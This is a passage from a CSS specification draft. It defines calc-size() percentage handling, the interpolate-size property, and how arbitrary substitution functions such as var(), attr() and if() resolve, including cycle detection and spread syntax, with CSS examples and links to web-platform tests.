 [size](#valdef-calc-size-size) keyword in `calc` with
 `insertion value`, wrapped in parentheses.

3. If this substitution would produce a value larger than an UA-defined
 limit, return failure.

 This is intentionally identical to the protection
 against substitution attacks defined for variable substitution; see
 [CSS Variables 1 § 3.3 Safely Handling Overly-Long
 Variables](https://www.w3.org/TR/css-variables-1/#long-variables).
 However, the use-cases for very long
 [calc-size()](#funcdef-calc-size) values are much less than for long custom
 properties, so UAs might wish to impose a smaller size limit.

To [de-percentify a calc-size
calculation] `calc`:

1. Replace every instance of a
 [\<percentage-token\>](https://drafts.csswg.org/css-syntax-3/#typedef-percentage-token) in `calc` with [(size
 \* N)], where N is the percentage's value divided by 100.
 Return `calc`.

 For example, [50% + 20px] becomes [(size \* .5) +
20px].

Why are percentages simplified in this way?

This percentage simplification ensures that transitions work linearly.

For example, say that 100% resolves to 100px.

If you transitioned from [calc-size(100px, size \* 2)] (resolves
to 200px) to [calc-size(50%, size - 20px)] (resolves to 30px) by
interpolating both the arguments, then at the halfway point you'd have
[calc-size(75px, size \* 2 \* .5 + (size - 20px) \* .5)] (resolves
to 102.5px), which is *not* halfway between 30 and 200 (that would be
115px). Interpolating one argument, then substituting it into another
calculation and interpolating that one too, generally gives *quadratic*
interpolation behavior.

Instead, we substitute the basis arg into the calculation arg, so you
get [calc-size(any, 100px \* 2)] and [calc-size(100%, (size \*
.5) - 20px)], and when interpolated, at the halfway point you get
[calc-size(100%, 100px \* 2 \* .5 + ((size \* .5) - 20px) \* .5)],
which does indeed resolve to 115px, as expected. Other points in the
transition are similarly linear.

### 11.3. Automatically interpolating sizing keywords: the [interpolate-size property]
Name:

[interpolate-size]

[Value:](https://www.w3.org/TR/css-values/#value-defs)

numeric-only
[\|](https://drafts.csswg.org/css-values-4/#comb-one) allow-keywords

[Initial:](https://www.w3.org/TR/css-cascade/#initial-values)

numeric-only

[Applies to:](https://www.w3.org/TR/css-cascade/#applies-to)

[all
elements](https://www.w3.org/TR/css-pseudo/#generated-content "Includes ::before and ::after pseudo-elements.")

[Inherited:](https://www.w3.org/TR/css-cascade/#inherited-property)

yes

[Percentages:](https://www.w3.org/TR/css-values/#percentages)

n/a

[Computed value:](https://www.w3.org/TR/css-cascade/#computed)

as specified

[Canonical order:](https://www.w3.org/TR/cssom/#serializing-css-values)

per grammar

[Animation type:](https://www.w3.org/TR/web-animations/#animation-type)

not animatable

This property allows keywords on the [sizing
properties](https://drafts.csswg.org/css-sizing-3/#sizing-property) to smoothly combine with
[\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage) values rather than using
[discrete](https://drafts.csswg.org/web-animations-1/#discrete) animation for this case. (See [Web Animations § 5.2
Animating
properties](https://drafts.csswg.org/web-animations-1/#animating-properties).)

[numeric-only]
: A
 [\<size-keyword\>](#typedef-calc-size-size-keyword) can only be combined with a
 compatible
 [\<calc-size()\>](#funcdef-calc-size).

[allow-keywords]
: Sizing values can also be combined if one of them is an
 [\<size-keyword\>](#typedef-calc-size-size-keyword) and the other is a
 [\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage). This is done by treating the
 [\<size-keyword\>] `keyword` as though it is
 [calc-size(`keyword`, size)] and applying the rules
 in [§ 11.2 Interpolating calc-size()](#interpolate-calc-size). In
 other cases, a
 [\<size-keyword\>] still cannot be interpolated.

 Setting
[allow-keywords](#valdef-interpolate-size-allow-keywords) allows *most* size values to be interpolated,
but not all; different keywords are still not interpolable with each
other, as layout algorithms can change their behavior based on precisely
which sizing keyword a descendant is using, in a way that can't be
represented during interpolation.

 Setting
[allow-keywords](#valdef-interpolate-size-allow-keywords) *mostly* removes the need to use
[calc-size()](#funcdef-calc-size) manually, but there are still some cases that can
benefit from using it. For example, if the [containing
block](https://drafts.csswg.org/css-display-4/#containing-block) size is
[indefinite](https://drafts.csswg.org/css-sizing-3/#indefinite), naively interpolating [width:
100%](https://drafts.csswg.org/css-sizing-3/#propdef-width) to [width: 0px]
won't work as expected (since the intermediate values might [behave as
auto](https://drafts.csswg.org/css-sizing-3/#behave-as-auto), making them the same size as [100%]), but
manually writing [width: calc-size(100%,
size);] and/or [width: calc-size(any,
0px);] will, causing the element to
smoothly interpolate between the two values.

 If we had a time machine, this property wouldn't exist;
the
[allow-keywords](#valdef-interpolate-size-allow-keywords) behavior would just be how things worked by
default. It exists because many existing style sheets assume that the
sizing keywords
([auto](https://drafts.csswg.org/css-sizing-3/#valdef-width-auto),
[min-content](https://drafts.csswg.org/css-sizing-3/#valdef-width-min-content), etc.) cannot interpolate at all, and would
produce broken behavior if they started interpolating. For compatibility
with this assumption, allowing this interpolation requires an opt-in.
Because the property inherits, specifying [:root { interpolate-size:
allow-keywords; }] allows the new behavior for the entire page. We
suggest doing this wherever compatibility isn't an issue.

The value of
[interpolate-size](#propdef-interpolate-size) that matters is the [computed
value](https://drafts.csswg.org/css-cascade-5/#computed-value) on the element at the time the animation might start.
For CSS transitions, this means the value in the [after-change
style](https://drafts.csswg.org/css-transitions-1/#after-change-style). An animation is not stopped or started later because
[interpolate-size]
changes.

## [ Appendix A: Arbitrary Substitution Functions]
An [arbitrary substitution function] is a [functional
notation](https://drafts.csswg.org/css-values-4/#functional-notation) that will, when resolved, substitute itself with other
values that are unknowable at parse time.

### [ Substitution]
Each [arbitrary substitution
function](#arbitrary-substitution-function) must define how to [replace an arbitrary substitution
function] for itself,
given a list of arguments and a
[stack](https://infra.spec.whatwg.org/#stack) of [substitution
contexts](#substitution-context), and likely involving further
[substitution](#substitute-arbitrary-substitution-function). It must return a sequence of [component
values](https://drafts.csswg.org/css-syntax-3/#component-value) (fully resolved, so no further [arbitrary substitution
functions] exist in the
sequence), which it will be replaced by.

A function's
[replacement](#replace-an-arbitrary-substitution-function) algorithm is called with the results of [early
substitution](#early-resolution) and parsing with the function's
[argument grammar](#argument-grammar), but nothing more. The algorithm will have to further
[substitute](#substitute-arbitrary-substitution-function) each argument it deals with, before
[parsing](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) it as the appropriate part of its *normal* grammar, and
then performing whatever logic it needs.

It might leave some arguments completely unsubstituted (for example, the
fallback argument of an [attr()](#funcdef-attr) function, if the attribute value exists and
correctly parses), or only parse some arguments based on the results of
evaluating other arguments (for example, later
[\<if-condition\>](#typedef-if-condition) values in an
[if()](#funcdef-if)
function are only evaluated if earlier ones evaluated as false, and only
the result in the \"successful\"
[\<if-branch\>](#typedef-if-branch) is evaluated).

To [substitute arbitrary substitution
functions]
in a sequence of [component
values](https://drafts.csswg.org/css-syntax-3/#component-value) `values`, given an optional [substitution
context](#substitution-context) `context`:

1. [Guard](#guarded)
 `context` for the remainder of this algorithm. If
 `context` is marked as a [cyclic substitution
 context](#cyclic-substitution-contexts), return the [guaranteed-invalid
 value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

2. [For
 each](https://infra.spec.whatwg.org/#list-iterate) [arbitrary substitution
 function](#arbitrary-substitution-function) `func` in `values` (ordered
 via a depth-first pre-order traversal) that is not nested in the
 contents of another [arbitrary substitution
 function]:

 1. [Substitute early-invoked
 functions](#substitute-early-invoked-functions) in `func`'s contents, and let
 `early result` be the result.

 2. If `early result` contains the [guaranteed-invalid
 value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value), replace `func` in
 `values` with the [guaranteed-invalid
 value] and
 [continue](https://infra.spec.whatwg.org/#iteration-continue).

 3. [Parse](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) `early result` according to
 `func`'s [argument
 grammar](#argument-grammar). If this returns failure, replace
 `func` in values with the [guaranteed-invalid
 value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value) and
 [continue](https://infra.spec.whatwg.org/#iteration-continue); otherwise, let `arguments` be the
 result.

 4. [Replace an arbitrary substitution
 function](#replace-an-arbitrary-substitution-function) for `func`, given
 `arguments`, as defined by that function. Let
 `result` be the returned list of [component
 values](https://drafts.csswg.org/css-syntax-3/#component-value).

 5. If `result` contains the [guaranteed-invalid
 value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value), replace `func` in
 `values` with the [guaranteed-invalid
 value]. Otherwise, replace
 `func` in `values` with
 `result`.

3. If `context` is marked as a [cyclic substitution
 context](#cyclic-substitution-contexts), return the [guaranteed-invalid
 value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value). [Nested [arbitrary substitution
 functions](#arbitrary-substitution-function) may have marked `context` as
 [cyclic](#cyclic-substitution-contexts) in step 2.]

4. Return `values`.

A [substitution context] is a
[list](https://infra.spec.whatwg.org/#list) consisting of: the dependency type, as a string; one or
more additional values, specific to the dependency type. (Usually, just
one additional string.)

As [arbitrary substitution
functions](#arbitrary-substitution-function) are
[resolved](https://webidl.spec.whatwg.org/#resolve) they accumulate [substitution
contexts](#substitution-context) which affect how *nested* [arbitrary substitution
functions] resolve.

For example, while resolving a
[var(\--foo)] function, the value of the [\--foo] property
is fetched and
[substituted](#substitute-arbitrary-substitution-function), with a [substitution
context](#substitution-context) of `«"property", "--foo"»`, preventing any
nested [arbitrary substitution
functions](#arbitrary-substitution-function) from cyclicly depending on [\--foo] as well.

While resolving an [attr(foo)] function, the value of the
[foo] attribute on the element is fetched and
[substituted](#substitute-arbitrary-substitution-function), with a [substitution
context](#substitution-context) of `«"attribute", "foo"»`, preventing any
nested functions from cyclicly depending on the [foo] attribute as
well.

The types of [substitution
contexts](#substitution-context) are currently:

- \"property\", followed by a property name, and optionally a [custom
 function](https://drafts.csswg.org/css-mixins-1/#custom-function).

- \"attribute\", followed by an attribute name.

- \"function\", followed by a [custom
 function](https://drafts.csswg.org/css-mixins-1/#custom-function).

[substitution](#substitute-arbitrary-substitution-function) is recursively invoked by nested [arbitrary
substitution
functions](#arbitrary-substitution-function) being
[replaced](#replace-an-arbitrary-substitution-function), [guards](#guarded)
\"stack up\" the [substitution
contexts](#substitution-context) passed to each invocation.

When a [substitution
context](#substitution-context) is [guarded], it means that, for the duration of the guard, an attempt to
guard a matching [substitution context]
again will mark all [substitution
contexts] involved in the cycle as
[cyclic substitution contexts].

For example, given the following
style:

``` highlight
.foo {
 --one: var(--two);
 --two: var(--one);
}
```

[Property
replacement](#property-replacement) for [\--one] invokes
[substitution](#substitute-arbitrary-substitution-function) with a [substitution
context](#substitution-context) of «\"property\", \"\--one\"».
[Substitution]
sees the [var(\--two)] function and invokes [replace a var()
function](#replace-an-arbitrary-substitution-function), which fetches the values of [\--two] and
[substitutes]
again, this time with a [substitution
context] of «\"property\", \"\--two\"».
That
[substitution]
sees the [var(\--one)] function and invokes [replace a var()
function], which
fetches the value of [\--one] and
[substitutes]
again, with a [substitution context] of
«\"property\", \"\--one\"».

This, finally, is a [cyclic substitution
context](#cyclic-substitution-contexts), since it matches the [substitution
context](#substitution-context) from the first
[substitution](#substitute-arbitrary-substitution-function), causing the
[substitution] to
just produce the [guaranteed-invalid
value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value). This percolates back up the nested invocations,
eventually resulting in [\--one] becoming [invalid at
computed-value
time](#invalid-at-computed-value-time). The same happens, in opposite order, when performing
[property
replacement](#property-replacement) on [\--two].

When a [cycle is
detected](#cyclic-substitution-contexts), all participants in the cycle become invalid. For
example, all of the following declarations become [invalid at
computed-value
time](#invalid-at-computed-value-time).

``` highlight
.foo {
 --one: var(--two);
 --two: var(--three, baz);
 --three: var(--one);
}
```

The presence of a fallback in `var(--three, baz)` does not
affect the outcome.

### [ Argument Grammars and Spread Syntax]
Each [arbitrary substitution
function](#arbitrary-substitution-function), in addition to its standard grammar, must define an
[argument grammar]: a much less specific and less restrictive version of its
normal grammar, which serves solely to separate the function's contents
into distinct arguments.

 Typically, an [argument
grammar](#argument-grammar)
will only consist of some punctuation (usually commas) and the
[\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) production. See the
[if()](#funcdef-if)
function for an example.

Each function, in its
[replacement](#replace-an-arbitrary-substitution-function) algorithm, will apply
[substitution](#substitute-arbitrary-substitution-function) to its arguments and then
[parse](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) them according to the appropriate parts of its standard
grammar. As it is in control of this process, however, some arguments
can be left unresolved and unparsed.

For example, the
[if()](#funcdef-if)
function's [argument
grammar](#argument-grammar)
merely divides its value into alternating \"test\" and \"result\"
arguments, separated by \`:\` and \`;\`. It then evaluates tests one by
one, and only evaluates a single argument matching the first successful
test.

This allows [if()](#funcdef-if) to achieve behavior similar to \`if\` constructs in
other programming languages, where later \"branches\" aren't evaluated
at all (beyond a basic parse) and thus can't cause errors in cases that
would be caught by earlier branches.

This means the following is a valid declaration when the viewport is
[600px] or wider, resulting in the value
[blue](https://drafts.csswg.org/css-color-4/#valdef-color-blue). Only when the viewport is narrower than
[600px] does the [if()](#funcdef-if) trigger cyclic behavior and cause [\--color] to
be [invalid at computed-value
time](#invalid-at-computed-value-time).

``` highlight
.foo {
 --color: if(media(width >= 600px): blue; else: var(--color));
}
```

This also means that, ordinarily, parsing according to a function's
[argument grammar](#argument-grammar) *does not* see the results of any nested [arbitrary
substitution
functions](#arbitrary-substitution-function); the contents are divided into arguments based only on
the values literally present inside the function.

For example, in [random-item(auto,
var(\--foo), var(\--bar))], the
[random-item()](#funcdef-random-item) function selects between two random values,
either the result of [var(\--foo)] or [var(\--bar)]. This is
true even if one of them contains commas, like:

``` highlight
.random-fonts {
 --foo: Courier, monospace;
 --bar: Arial, serif;
 font-family: random-item(auto, var(--foo), var(--bar));
 /* equivalent to: */
 font-family: random-item(auto, {Courier, monospace}, {Arial, serif});

 /* and thus, randomly, equivalent to either */
 font-family: Courier, monospace;
 /* or */
 font-family: Arial, serif;
}
```

This behavior ensures that authors don't have to defensively wrap any
arguments containing [arbitrary substitution
functions](#arbitrary-substitution-function) in characters; what you see is what you get.

 This is different from the behavior of [arbitrary
substitution
functions](#arbitrary-substitution-function) substituted into \"normal\" functions or properties.
For example, [\--colors: red, blue, green; background:
linear-gradient(var(\--colors));] works in
the expected fashion, producing a gradient with three color stops,
because normal functions don't do this separate [argument
grammar](#argument-grammar)
parse.

This behavior can be worked around by immediately preceding an
[arbitrary substitution
function](#arbitrary-substitution-function) with the [spread syntax] [\...], indicating that it
must be resolved \"early\", before division into arguments.

For example, the following **will not
work**:

``` highlight
.invalid-if {
 --if-clause: media(width >= 600px): blue;
 color: if(var(--if-clause); else: green;);
}
```

The [if()](#funcdef-if)
function entirely fails to parse according to its [argument
grammar](#argument-grammar): there's no \`:\` character separating the test from
the value in the first branch.

To get the desired behavior of \"spreading\" the variable into the
function's arguments, use [\...]\':

``` highlight
.valid-if {
 --if-clause: media(width >= 600px): blue;
 color: if(...var(--if-clause); else: green;);
}
```

The [spread syntax](#spread-syntax) is three distinct
[\<delim-token\>](https://drafts.csswg.org/css-syntax-3/#typedef-delim-token)s with the value \`\".\"\`, all of
which must not contain any whitespace between them, or between the group
and the subsequent [arbitrary substitution
function](#arbitrary-substitution-function).

That is, [\...var(\--foo)] is a
valid use of the [spread syntax](#spread-syntax), but [\... var(\--foo)] is not, nor is [. .
.var(\--foo)].

The latter usages will result in the [arbitrary substitution
function](#arbitrary-substitution-function) being evaluated at the normal time, *after* the
[argument grammar](#argument-grammar) has been applied, and the period characters being part
of the function's value.

 The [spread
syntax](#spread-syntax) is only
used *within* an [arbitrary substitution
function's](#arbitrary-substitution-function) value, as it's only referenced by the
[substitution](#substitute-arbitrary-substitution-function) algorithm when parsing an [arbitrary substitution
function]. Using it outside
of that, such as in [width:
\...var(\--sidebar-width);](https://drafts.csswg.org/css-sizing-3/#propdef-width), is not recognized as an early invocation;
instead, the periods are just part of the property's value, unrelated to
the
[var()](https://drafts.csswg.org/css-variables-2/#funcdef-var) function, and would in this case make the
[width] property invalid. (This is
similar to JavaScript, where this syntax was borrowed from, where \`\[1,
\...arr, 5\]\` is valid, but \`var x = \...arr;\` is not.)

To [substitute early-invoked
functions] in a sequence of [component
values](https://drafts.csswg.org/css-syntax-3/#component-value) `values`:

1. [For
 each](https://infra.spec.whatwg.org/#list-iterate) [arbitrary substitution
 function](#arbitrary-substitution-function) `func` in `values` (ordered
 via a depth-first pre-order traversal) using the [spread
 syntax](#spread-syntax)
 that is not nested in the contents of another [arbitrary
 substitution function]:

 1. [Substitute early-invoked
 functions](#substitute-early-invoked-functions) in `func`'s contents, and let
 `early result` be the result.

 2. If `early result` contains the [guaranteed-invalid
 value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value), replace `func` in
 `values` with the [guaranteed-invalid
 value] and
 [continue](https://infra.spec.whatwg.org/#iteration-continue).

 3. [Parse](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) `early result` acccording to
 `func`'s [argument
 grammar](#argument-grammar). If this returns failure, replace
 `func` in values with the [guaranteed-invalid
 value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value) and
 [continue](https://infra.spec.whatwg.org/#iteration-continue); otherwise, let `arguments` be the
 result.

 4. [Replace an arbitrary substitution
 function](#replace-an-arbitrary-substitution-function) for `func`, given
 `arguments`, as defined by that function. Let
 `result` be the returned list of [component
 values](https://drafts.csswg.org/css-syntax-3/#component-value).

 5. If `result` contains the [guaranteed-invalid
 value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value), replace `func` in
 `values` with the [guaranteed-invalid
 value]. Otherwise, replace
 `func` in `values` with
 `result`.

2. Return `values`.

### [ Resolving in Properties]
Unless otherwise specified, [arbitrary substitution
functions](#arbitrary-substitution-function) can be used in place of any part of any property's
value (including within other [functional
notations](https://drafts.csswg.org/css-values-4/#functional-notation)); and are not valid in any other context.

Should any of these functions be valid
in contexts outside of properties?

Tests

- [variable-external-font-face-01.html](https://wpt.fyi/results/css/css-variables/variable-external-font-face-01.html "css/css-variables/variable-external-font-face-01.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-external-font-face-01.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-external-font-face-01.html)
- [variable-font-face-01.html](https://wpt.fyi/results/css/css-variables/variable-font-face-01.html "css/css-variables/variable-font-face-01.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-font-face-01.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-font-face-01.html)
- [variable-font-face-02.html](https://wpt.fyi/results/css/css-variables/variable-font-face-02.html "css/css-variables/variable-font-face-02.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-font-face-02.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-font-face-02.html)

For example, the following code
incorrectly attempts to use a variable as a property name:

``` highlight
.foo {
 --side: margin-top;
 var(--side): 20px;
}
```

This is *not* equivalent to setting [margin-top:
20px;](https://drafts.csswg.org/css-box-4/#propdef-margin-top). Instead, the second declaration is simply
thrown away as a syntax error for having an invalid property name.

If a property value contains one or more [arbitrary substitution
functions](#arbitrary-substitution-function), and all of those functions are themselves
syntactically valid according to their [argument
grammar](#argument-grammar)s, the entire value's grammar must be assumed to be
valid at parse time.

Tests

- [variable-reference-18.html](https://wpt.fyi/results/css/css-variables/variable-reference-18.html "css/css-variables/variable-reference-18.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-reference-18.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-reference-18.html)
- [variable-reference-19.html](https://wpt.fyi/results/css/css-variables/variable-reference-19.html "css/css-variables/variable-reference-19.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-reference-19.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-reference-19.html)
- [variable-reference-30.html](https://wpt.fyi/results/css/css-variables/variable-reference-30.html "css/css-variables/variable-reference-30.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-reference-30.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-reference-30.html)

[Arbitrary substitution
functions](#arbitrary-substitution-function) are
[substituted](#substitute-arbitrary-substitution-function) during style
[computation](https://drafts.csswg.org/css-cascade-5/#computed-value), before any other value transformations or
introspection can occur. If a property, after [property
replacement](#property-replacement), does not match its declared grammar, the declaration
is [invalid at computed-value
time](#invalid-at-computed-value-time).

 Since [arbitrary substitution
functions](#arbitrary-substitution-function) resolve at [computed
value](https://drafts.csswg.org/css-cascade-5/#computed-value) time, if the resulting value after substitution is
invalid, the property falls back (essentially) to
[unset](https://drafts.csswg.org/css-cascade-5/#valdef-all-unset) behavior, rather than falling back to an earlier
value in the
[cascade](https://drafts.csswg.org/css-cascade-6/#cascade) the way declarations invalid at parse time do. See
[Invalid Substitution](#invalid-substitution).

Tests

- [variable-declaration-16.html](https://wpt.fyi/results/css/css-variables/variable-declaration-16.html "css/css-variables/variable-declaration-16.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-declaration-16.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-declaration-16.html)
- [variable-declaration-17.html](https://wpt.fyi/results/css/css-variables/variable-declaration-17.html "css/css-variables/variable-declaration-17.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-declaration-17.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-declaration-17.html)
- [variable-declaration-18.html](https://wpt.fyi/results/css/css-variables/variable-declaration-18.html "css/css-variables/variable-declaration-18.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-declaration-18.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-declaration-18.html)
- [variable-declaration-19.html](https://wpt.fyi/results/css/css-variables/variable-declaration-19.html "css/css-variables/variable-declaration-19.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-declaration-19.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-declaration-19.html)
- [variable-declaration-21.html](https://wpt.fyi/results/css/css-variables/variable-declaration-21.html "css/css-variables/variable-declaration-21.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-declaration-21.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-declaration-21.html)
- [variable-transitions-transition-property-all-before-value.html](https://wpt.fyi/results/css/css-variables/variable-transitions-transition-property-all-before-value.html "css/css-variables/variable-transitions-transition-property-all-before-value.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-transitions-transition-property-all-before-value.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-transitions-transition-property-all-before-value.html)
- [variable-transitions-value-before-transition-property-all.html](https://wpt.fyi/results/css/css-variables/variable-transitions-value-before-transition-property-all.html "css/css-variables/variable-transitions-value-before-transition-property-all.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-transitions-value-before-transition-property-all.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-transitions-value-before-transition-property-all.html)

If a property value, after [property
replacement](#property-replacement), contains only a single [CSS-wide
keyword](https://drafts.csswg.org/css-values-4/#css-wide-keywords) (and possibly whitespace/comments), its value is
determined as if that keyword were its [specified
value](https://drafts.csswg.org/css-cascade-5/#specified-value) all along.

Tests

- [whitespace-in-fallback-crash.html](https://wpt.fyi/results/css/css-variables/whitespace-in-fallback-crash.html "css/css-variables/whitespace-in-fallback-crash.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/whitespace-in-fallback-crash.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/whitespace-in-fallback-crash.html)
- [wide-keyword-fallback-001.html](https://wpt.fyi/results/css/css-variables/wide-keyword-fallback-001.html "css/css-variables/wide-keyword-fallback-001.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/wide-keyword-fallback-001.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/wide-keyword-fallback-001.html)
- [wide-keyword-fallback-002.html](https://wpt.fyi/results/css/css-variables/wide-keyword-fallback-002.html "css/css-variables/wide-keyword-fallback-002.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/wide-keyword-fallback-002.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/wide-keyword-fallback-002.html)

For example, the following usage is
fine from a syntax standpoint, but results in nonsense when the variable
is substituted in:

``` highlight
:root { --looks-valid: 20px; }
p { background-color: var(--looks-valid); }
```

Since [20px] is an invalid value for
[background-color](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-color), the property becomes [invalid at
computed-value
time](#invalid-at-computed-value-time), and instead resolves to
[transparent](https://drafts.csswg.org/css-color-4/#valdef-color-transparent) (the [initial
value](https://drafts.csswg.org/css-cascade-5/#initial-value) for
[background-color]).

If the property was one that's inherited by default, such as
[color](https://drafts.csswg.org/css-color-4/#propdef-color), it would compute to the inherited
value rather than the initial value.

While a
[var()](https://drafts.csswg.org/css-variables-2/#funcdef-var) function can't get a [CSS-wide
keyword](https://drafts.csswg.org/css-values-4/#css-wide-keywords) from the [custom
property](https://drafts.csswg.org/css-variables-2/#custom-property) itself---​if you tried to specify that, like [\--foo:
initial;], it would just trigger [explicit
defaulting](https://drafts.csswg.org/css-cascade-4/#defaulting-keywords)
for the custom property---​it can have a [CSS-wide
keyword] in its fallback:

``` highlight
p { color: var(--does-not-exist, initial); }
```

In the above code, if the [\--does-not-exist] property didn't
exist or is [invalid at computed-value
time](#invalid-at-computed-value-time), the
[var()](https://drafts.csswg.org/css-variables-2/#funcdef-var) will instead substitute in the
[initial](https://drafts.csswg.org/css-cascade-5/#valdef-all-initial) keyword, making the property behave as if it was
originally [color:
initial](https://drafts.csswg.org/css-color-4/#propdef-color). This will make it take on the document's
initial [color] value, rather than
defaulting to inheritance, as it would if there were no fallback.

To [replace substitution functions in a property]
`prop`:

1. [Substitute arbitrary substitution
 functions](#substitute-arbitrary-substitution-function) in `prop`'s value, given «\"property\",
 `prop`'s name» as the [substitution
 context](#substitution-context). Let `result` be the returned [component
 value](https://drafts.csswg.org/css-syntax-3/#component-value) sequence.

2. If `result` contains the [guaranteed-invalid
 value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value), `prop` is [invalid at computed-value
 time](#invalid-at-computed-value-time); return.

3. [Parse](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) `result` according to
 `prop`'s grammar. If this returns failure,
 `prop` is [invalid at computed-value
 time](#invalid-at-computed-value-time); return.

4. Otherwise, replace `prop`'s value with the parsed result.

- [css-variable-change-style-001.html](https://wpt.fyi/results/css/css-variables/css-variable-change-style-001.html "css/css-variables/css-variable-change-style-001.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/css-variable-change-style-001.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/css-variable-change-style-001.html)
- [css-variable-change-style-002.html](https://wpt.fyi/results/css/css-variables/css-variable-change-style-002.html "css/css-variables/css-variable-change-style-002.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/css-variable-change-style-002.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/css-variable-change-style-002.html)
- [variable-declaration-01.html](https://wpt.fyi/results/css/css-variables/variable-declaration-01.html "css/css-variables/variable-declaration-01.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-declaration-01.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-declaration-01.html)
- [variable-declaration-02.html](https://wpt.fyi/results/css/css-variables/variable-declaration-02.html "css/css-variables/variable-declaration-02.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-declaration-02.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-declaration-02.html)
- [variable-declaration-03.html](https://wpt.fyi/results/css/css-variables/variable-declaration-03.html "css/css-variables/variable-declaration-03.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-declaration-03.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-declaration-03.html)
- [variable-declaration-04.html](https://wpt.fyi/results/css/css-variables/variable-declaration-04.html "css/css-variables/variable-declaration-04.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-declaration-04.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-declaration-04.html)
- [variable-declaration-05.html](https://wpt.fyi/results/css/css-variables/variable-declaration-05.html "css/css-variables/variable-declaration-05.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-declaration-05.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-declaration-05.html)
- [variable-generated-content-dynamic-001.html](https://wpt.fyi/results/css/css-variables/variable-generated-content-dynamic-001.html "css/css-variables/variable-generated-content-dynamic-001.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-generated-content-dynamic-001.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-generated-content-dynamic-001.html)
- [variable-presentation-attribute.html](https://wpt.fyi/results/css/css-variables/variable-presentation-attribute.html "css/css-variables/variable-presentation-attribute.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-presentation-attribute.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-presentation-attribute.html)
- [variable-reference-01.html](https://wpt.fyi/results/css/css-variables/variable-reference-01.html "css/css-variables/variable-reference-01.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-reference-01.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-reference-01.html)
